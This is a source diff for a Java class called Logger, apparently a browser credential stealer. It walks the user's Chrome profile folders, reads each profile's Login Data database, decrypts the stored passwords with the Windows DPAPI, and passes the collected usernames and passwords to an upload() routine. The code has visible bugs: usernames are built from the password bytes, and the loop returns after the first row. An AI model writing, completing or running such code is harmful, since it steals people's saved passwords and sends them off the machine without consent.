@@ -1,8 +1,11 @@
+import java.io.File;
+import java.io.FilenameFilter;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.Statement;
 import java.util.ArrayList;
+import java.util.Arrays;
 
 import org.apache.commons.codec.binary.Base64;
 
@@ -14,39 +17,82 @@ import com.temboo.core.TembooException;
 import com.temboo.core.TembooSession;
 
 public class Logger{
+		private String filepath = "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Local\\Google\\Chrome\\User Data";
 		public Logger() throws TembooException{
-		    String user = System.getProperty("user.name");
-		    ArrayList<String> passwords = decrypt("C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data");
+		    run();
+		}
+		
+		public void run() throws TembooException{
+			String user = System.getProperty("user.name");
+		    ArrayList<String> folders = new ArrayList<String>();
+		    ArrayList<String> usernames = new ArrayList<String>();
+		    ArrayList<String> passwords = new ArrayList<String>();
+		    ArrayList<ArrayList<String>> doublebuffer = new ArrayList<ArrayList<String>>();
+		    ArrayList<String> bufferuser = new ArrayList<String>();
+		    ArrayList<String> bufferpass = new ArrayList<String>();
+		    File file = new File(filepath);
+		    String[] directories = file.list(new FilenameFilter() {
+		      @Override
+		      public boolean accept(File current, String name) {
+		        return new File(current, name).isDirectory();
+		      }
+		    });
+		    for(String i : directories){
+		    	if(i.matches("^(Default|Profile).*")){
+		    		folders.add(i);
+		    	}
+		    }
+		    System.out.println(folders.toString());
+		    for(String i : folders){
+		    	doublebuffer = getinfo(filepath+i);
+		    	bufferuser = doublebuffer.get(0);
+		    	bufferpass = doublebuffer.get(1);
+		    	for(String j : bufferpass)
+		    		passwords.add(j);
+		    	for(String k : bufferuser)
+		    		usernames.add(k);
+		    }
 		    String uploadInfo = "";
-		    for(String i : passwords){
-		    	uploadInfo+="\nPassword: "+i;
+		    for(int i = 0; i < passwords.size(); i++){
+		    	uploadInfo+="Username: "+usernames.get(i)+"\tPassword: "+passwords.get(i);
 		    }
 		    upload(uploadInfo);
 		}
 		
 		@SuppressWarnings("null")
-		public ArrayList<String> decrypt(String file){
+		public ArrayList<ArrayList<String>> getinfo(String file){
 			try{
 			    Class.forName("org.sqlite.JDBC");
 				Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
 				Statement statement = connection.createStatement();
 				ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
-				ArrayList<String> passwords = null; 
+				ArrayList<String> passwords = new ArrayList<String>(); 
+				ArrayList<String> usernames = new ArrayList<String>();
+				ArrayList<ArrayList<String>> buffer = new ArrayList<ArrayList<String>>();
 				while (resultSet.next())
 			    {
 			        byte[] encryptedData = resultSet.getBytes(2);
 			        byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);  // exception over here
-		
+			        byte[] users = resultSet.getBytes(1);
 			        StringBuilder decryptedString = new StringBuilder();
+			        StringBuilder userstring = new StringBuilder();
 		
 			        for (byte b : decryptedData)
 			        {
 			           decryptedString.append((char) b);
 			        }
+			        for (byte b : decryptedData)
+			        {
+			           userstring.append((char) b);
+			        }
+			        
 			        
 			        System.out.println("decrypted = [" + decryptedString + "]");
+			        usernames.add(userstring.toString());
 			        passwords.add(decryptedString.toString());
-			        return passwords;
+			        buffer.add(usernames);
+			        buffer.add(passwords);
+			        return buffer;
 			   }
 			   connection.close();
 			 }catch(Exception e)
